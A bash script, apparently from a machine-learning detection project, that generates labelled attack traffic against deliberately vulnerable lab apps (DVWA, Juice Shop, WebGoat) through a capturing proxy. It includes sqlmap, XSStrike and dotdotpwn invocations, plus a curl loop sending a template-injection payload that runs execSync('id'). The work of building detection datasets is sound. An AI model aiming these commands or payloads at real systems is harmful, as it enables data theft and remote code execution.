#!/usr/bin/env bash
# ==============================================================================
# Attack traffic generation - OPTIONAL real-tool layer (sqlmap/XSStrike/dotdotpwn).
#
# NOTE: the PRIMARY, label-safe generator is now src/attacks/attack_driver.py
# (persona + scenario + variant driven, sets every X-Capture-* header). Use
# THIS script only when you also want real fuzzing-tool volume on top.
#
# Attack matrix (paired within app):
#   app        | sqli | xss | path_traversal        | code_injection (CWE-94)
#   juice_shop |  Y   |  Y  | (-)                    | Y SSTI (Pug)  -> held-out
#   webgoat    |  Y   |  Y  | Y (PathTraversal)      | X
#   dvwa       |  Y   |  Y  | Y (File Inclusion LFI) | X (DVWA is Command Inj CWE-78)
#
# All traffic is routed through mitmproxy-attack (port 8889), which writes to
# the SEPARATE dir data/raw_attack (see docker-compose.yml) so it never
# collides with / gets wiped alongside benign data/raw files.
# ==============================================================================
set -euo pipefail

# ------------------------------------------------------------------------------
# FIX 1 (localhost -> docker service names): the attack proxy is a container on
# lab_net. It CANNOT resolve the host's "localhost"; it must be given the
# in-network service names (exactly like benign_driver.py uses base_url). The
# tool runs on the host, but the PROXY performs the DNS resolution.
# ------------------------------------------------------------------------------
PROXY="http://127.0.0.1:8889"
JUICE="http://juice-shop:3000"
DVWA="http://dvwa:80"
WEBGOAT="http://webgoat:8080/WebGoat"

# ------------------------------------------------------------------------------
# FIX 2 (labelling): the attack proxy defaults to default_label=sqli. Tools that
# CAN send headers (sqlmap, curl) override it via X-Capture-Label below. Tools
# that CANNOT (XSStrike, dotdotpwn) would be mislabelled 'sqli'. For those, run
# them against a proxy whose default_label matches the attack type, e.g.:
#
#   # XSS run:
#   docker compose run --rm -p 8889:8889 mitmproxy-attack \
#     mitmdump -s /addons/capture_addon.py --set capture_dir=/out/raw \
#     --set default_label=xss --set default_tool=xsstrike --set default_mode=tool \
#     --listen-port 8889
#   # Path-traversal run:  --set default_label=path_traversal --set default_tool=dotdotpwn
#
# (Simplest alternative: skip the tools and use attack_driver.py, which labels
#  every request correctly with no proxy reconfiguration.)
# ------------------------------------------------------------------------------

# NOTE (XSStrike proxy): XSStrike reads its proxy from core/config.py, NOT the
# CLI. Set  PROXY = "http://127.0.0.1:8889"  in that file before running.

# ----------------------------- SQLi (sqlmap) -----------------------------
# sqlmap CAN send custom headers -> labels itself correctly.
sqli_dvwa() {
  # Grab a fresh PHPSESSID (security=low) and pass it below.
  sqlmap -u "$DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=REPLACE_ME; security=low" \
    --proxy="$PROXY" --batch --level=3 --risk=2 \
    --headers="X-Capture-App: dvwa\nX-Capture-Label: sqli\nX-Capture-Type: scripted\nX-Capture-Mode: tool\nX-Capture-Tool: sqlmap"
}
sqli_juice() {
  sqlmap -u "$JUICE/rest/products/search?q=test" \
    --proxy="$PROXY" --batch --level=3 --risk=2 \
    --headers="X-Capture-App: juice_shop\nX-Capture-Label: sqli\nX-Capture-Type: scripted\nX-Capture-Mode: tool\nX-Capture-Tool: sqlmap"
}
sqli_webgoat() {
  sqlmap -u "$WEBGOAT/SqlInjection/attack?account=test&operator=x&injection=y" \
    --proxy="$PROXY" --batch --level=2 --risk=2 \
    --headers="X-Capture-App: webgoat\nX-Capture-Label: sqli\nX-Capture-Type: scripted\nX-Capture-Mode: tool\nX-Capture-Tool: sqlmap"
}

# ----------------------------- XSS (XSStrike) -----------------------------
# Run these against a proxy started with --set default_label=xss (see FIX 2).
xss_dvwa() {
  python3 xsstrike.py -u "$DVWA/vulnerabilities/xss_r/?name=test" --proxy
}
xss_juice() {
  python3 xsstrike.py -u "$JUICE/rest/products/search?q=test" --proxy
}
xss_webgoat() {
  python3 xsstrike.py -u "$WEBGOAT/CrossSiteScripting/attack5a?field1=test" --proxy
}

# ------------------------- Path Traversal (DotDotPwn) -------------------------
# Run these against a proxy started with --set default_label=path_traversal.
pt_dvwa() {   # DVWA File Inclusion (LFI)
  dotdotpwn -m http -h dvwa -f "/vulnerabilities/fi/?page=TRAVERSAL" -k "root:" -x 8889 -d 6 -b
}
pt_webgoat() {
  dotdotpwn -m http -h webgoat -f "/WebGoat/PathTraversal?file=TRAVERSAL" -k "root:" -x 8889 -d 6 -b
}

# ===== Code Injection (CWE-94) - HELD-OUT UNKNOWN (open-set) =====
# curl CAN send headers -> labels itself code_injection (split_role auto = heldout_unknown).
ci_juice_ssti() {
  local payloads=("#{7*7}" "#{root.process.mainModule.require('child_process').execSync('id')}")
  for p in "${payloads[@]}"; do
    curl -s -x "$PROXY" \
      -H "X-Capture-App: juice_shop" -H "X-Capture-Label: code_injection" \
      -H "X-Capture-Type: scripted" -H "X-Capture-Mode: tool" \
      -H "X-Capture-Tool: payloads_replay" \
      --data-urlencode "username=$p" "$JUICE/profile" >/dev/null || true
  done
}

echo "Uncomment the functions you want, after setting cookies/URLs and the proxy label (see FIX 2)."
# --- training attacks ---
# sqli_dvwa; sqli_juice; sqli_webgoat
# xss_dvwa; xss_juice; xss_webgoat            # proxy default_label=xss
# pt_dvwa; pt_webgoat                          # proxy default_label=path_traversal
# --- held-out unknown ---
# ci_juice_ssti
